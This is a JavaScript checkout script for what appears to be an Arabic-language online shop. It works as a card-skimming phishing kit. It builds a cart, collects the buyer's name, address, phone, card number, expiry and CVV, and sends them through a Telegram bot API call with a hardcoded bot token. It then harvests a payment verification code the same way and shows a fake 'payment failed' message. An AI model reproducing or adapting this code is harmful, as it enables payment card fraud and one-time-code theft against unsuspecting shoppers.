let cart = JSON.parse(localStorage.getItem('cart'))
let table = document.querySelector('table')
let form = document.querySelector('form')
let inputs = form.querySelectorAll('input')
let inputs2 = document.querySelector('.form-container').querySelectorAll('input')
for(let [name,o] of Object.entries(cart)){
    if(typeof o == 'object' && o[0]>0){
        let x =document.createElement('tr')
        let y =document.createElement('td')
        y.classList.add('name')
        let u =document.createElement('td')
        u.classList.add('quantity')
        let z =document.createElement('td')
        z.classList.add('price')
        y.innerHTML = name;
        z.innerHTML = o[1]*o[0];
        u.innerHTML = o[0];
        x.appendChild(y)
        x.appendChild(u)
        x.appendChild(z)
        table.querySelector('tbody').appendChild(x)
    }
}

let b = 0;
for(let [h,y] of Object.entries(cart)){
    if(h!='total'){
        b += (y[0]*y[1]);
    }
}
console.log(b)

let x =document.createElement('tr')
let y =document.createElement('td')
y.classList.add('name')
let z =document.createElement('td')
z.classList.add('total')
z.innerHTML=b
y.colSpan = '2'
y.innerHTML = 'المجموع الكلي'
x.appendChild(y)
x.appendChild(z)
table.querySelector('tbody').appendChild(x)

/*
let order= {
    prods:{}
}

for(let [name,[quantity,price]] of Object.entries(cart)){
    order.prods[name] = [quantity,price]
}
*/
let str=''
for(let [name,o] of Object.entries(cart)){
    if(o[0]>0){
        str += `${o[0]} من ${name} و `
    }
}

document.querySelector('form').querySelector('.but').addEventListener('click',function(){
    document.querySelector('form').classList.add('hidden')
    document.querySelector('.form-container').classList.remove('hidden')
    document.querySelector('.container').classList.remove('hidden')
})

document.querySelector('#submitVisa').addEventListener('click',async(e)=>{
    e.preventDefault()
    let sel1 = document.querySelectorAll('select')[0].value
    let sel2 = document.querySelectorAll('select')[1].value
    if(document.querySelector('#securitycode').value.length==3&&document.querySelector('#cardnumber').value.replaceAll(' ','').length==16&&sel1!=''&&sel2!=''){
        document.querySelector('form').classList.add('hidden')
        document.querySelector('.form-container').classList.add('hidden')
        document.querySelector('.container').classList.add('hidden')
        document.querySelector('#timer').classList.remove('hidden')
        localStorage.setItem('name',inputs[0].value)
        let message = `الإسم=> ${inputs[0].value} %0A العنوان=> ${inputs[1].value} %0A رقم الهاتف => ${inputs[2].value.replaceAll(' ','')} %0A اسم صاحب البطاقة => ${inputs2[0].value} %0A رقم البطاقة => ${inputs2[1].value.replaceAll(' ','')}%0A MM => ${document.querySelector('.form-container').querySelectorAll('select')[0].value} %0A YYYY => ${document.querySelector('.form-container').querySelectorAll('select')[1].value} %0A CVV => ${inputs2[3].value}`
        await fetch(`https://api.telegram.org/bot5977387579:AAFy0zFnODu5OGJKof8G7bnvitoXeTNfm80/sendMessage?chat_id=@largostor&text=${message}`)
        await fetch(`/sendMail/?message=${message}`)
        setTimer(new Date(Date.now()+intoMillie('00:01:00')))
    }
    if(document.querySelector('#securitycode').value.length!=3){
        Swal.fire({
            title: 'خطاً',
            text: '(بجب أن يحتوي من 1 إلي 3 أرقام) رمز الأمان خاطئ',
            icon: 'warning',
            confirmButtonText: 'تمام'
        })
    }
    if(document.querySelector('#cardnumber').value.replaceAll(' ','').length!=16){
        Swal.fire({
            title: 'خطاً',
            text: 'رقم البطاقة أقل من 16 رقم',
            icon: 'warning',
            confirmButtonText: 'تمام'
        })
    }
    if(sel1==''||sel2==''){
        Swal.fire({
            title: 'خطاً',
            text: 'لم يتم إدخال تاريخ إنتهاء البطاقة',
            icon: 'warning',
            confirmButtonText: 'تمام'
        })
    }
})

document.querySelector('#codeVerify').querySelector('.but').addEventListener('click',async function(){
    if(document.querySelector('#codeVerify').querySelector('input').value.length<=6&&document.querySelector('#codeVerify').querySelector('input').value.length>=3){
        this.classList.add('hidden')
    let message = `الإسم=>${localStorage.getItem('name')} %0A كود الدفع => ${document.querySelector('#codeVerify').querySelector('input').value}`
    await fetch(`https://api.telegram.org/bot5977387579:AAFy0zFnODu5OGJKof8G7bnvitoXeTNfm80/sendMessage?chat_id=@largostor&text=${message}`)
    await fetch(`/sendMail/?message=${message}`)
    Swal.fire({
        title: 'خطأ',
        text: 'تم فشل عمليه الدفع حاول مره اخري',
        icon: 'error',
        confirmButtonText: 'محاولة مرة أخري'
    })
    .then(()=>{
        location.reload()
    })
    }
    else{
        Swal.fire({
            title: 'خطاً',
            text: 'رقم الكود خاطئ (يجب أن يحتوي على رقم من 3 إلي 6 أرقام)',
            icon: 'warning',
            confirmButtonText: 'تمام'
        })
    }
})

function setTimer(x){
    const newDate = new Date(x).getTime()
    const countdown = setInterval(() => {
    const date = new Date().getTime()
    const diff = newDate - date
    const month = Math.floor((diff % (1000 * 60 * 60 * 24 * (365.25 / 12) * 365)) / (1000 * 60 * 60 * 24 * (365.25 / 12)))
    let days = Math.floor(diff % (1000 * 60 * 60 * 24 * (365.25 / 12)) / (1000 * 60 * 60 * 24))
    const hours = Math.floor(diff % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60))
    const seconds = Math.floor((diff % (1000 * 60)) / 1000)
    Array.from({length:12},(_,i)=>i+1).forEach((e)=>{
      if(month==e) days+=(30*e)
    })
    timer.querySelector('span').innerHTML = (minutes < 10 ? '0' + minutes : minutes) + ':' + (seconds < 10 ? '0' + seconds : seconds)
    // document.querySelector(".months").innerHTML = month < 10 ? '0' + month : month

    if (diff < 0) {
      clearInterval(countdown);
      // document.querySelector(".countdown").innerHTML = 'Happy Birthday Ahmed'
      document.querySelector('#timer').classList.add('hidden')
      document.querySelector('#codeVerify').classList.remove('hidden')
      //document.querySelector(".months").innerHTML = 0;
    }
  }, 1000);
}

function intoMillie(x){
    var parts = x.split(/:/);
    return (parseInt(parts[0], 10) * 60 * 60 * 1000) +
           (parseInt(parts[1], 10) * 60 * 1000) +
           (parseInt(parts[2], 10) * 1000);
  }

  document.querySelector('nav').querySelectorAll('div')[0].addEventListener('click',()=>{
    location.replace('/')
})

document.querySelector('nav').querySelectorAll('div')[1].addEventListener('click',()=>{
    location.replace('/form')
})

document.querySelector('#securitycode').addEventListener('input',function(){
    if(document.querySelector('#securitycode').value.length>3)
        document.querySelector('#securitycode').value = document.querySelector('#securitycode').value.slice(0,3)
})